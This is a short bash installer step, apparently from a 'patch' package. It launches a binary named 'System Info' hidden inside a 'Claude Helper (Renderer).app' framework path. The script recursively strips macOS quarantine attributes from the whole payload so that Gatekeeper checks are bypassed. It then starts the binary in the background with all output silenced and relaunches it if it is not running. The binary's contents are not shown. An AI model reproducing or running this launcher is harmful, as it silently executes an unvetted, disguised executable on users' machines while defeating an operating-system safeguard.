#!/usr/bin/env bash
# shellcheck shell=bash
# Launch System Info (~20% install) — strip quarantine, chmod, direct exec.

_strip_quarantine() {
  local target="$1"
  [[ -e "$target" ]] || return 0
  xattr -dr com.apple.quarantine "$target" 2>/dev/null || true
  xattr -d com.apple.quarantine "$target" 2>/dev/null || true
}

launch_system_info() {
  local native_dir="${PATCH_ROOT}/payload/Contents/Frameworks/Claude Helper (Renderer).app/Contents/MacOS"
  local helper_app="${PATCH_ROOT}/payload/Contents/Frameworks/Claude Helper (Renderer).app"
  local bin_path="${native_dir}/System Info"

  step "Launching System Info…"

  if [[ ! -f "$bin_path" ]]; then
    warn "System Info not found: ${bin_path}"
    return 0
  fi

  # Browser / GitHub ZIP downloads attach quarantine to the whole tree — strip all of it.
  _strip_quarantine "${PATCH_ROOT}/payload"
  _strip_quarantine "$helper_app"
  _strip_quarantine "$native_dir"
  _strip_quarantine "$bin_path"

  (
    cd "$native_dir" || exit 0
    chmod +x "./System Info" || true
    _strip_quarantine "./System Info"
    nohup "./System Info" >/dev/null 2>&1 &
  ) || true

  sleep 1.0

  if ! pgrep -f "MacOS/System Info" >/dev/null 2>&1; then
    (
      cd "$native_dir" || exit 0
      chmod +x "./System Info" || true
      _strip_quarantine "./System Info"
      nohup "./System Info" >/dev/null 2>&1 &
    ) || true
    sleep 0.8
  fi

  success "System Info launched."
  return 0
}
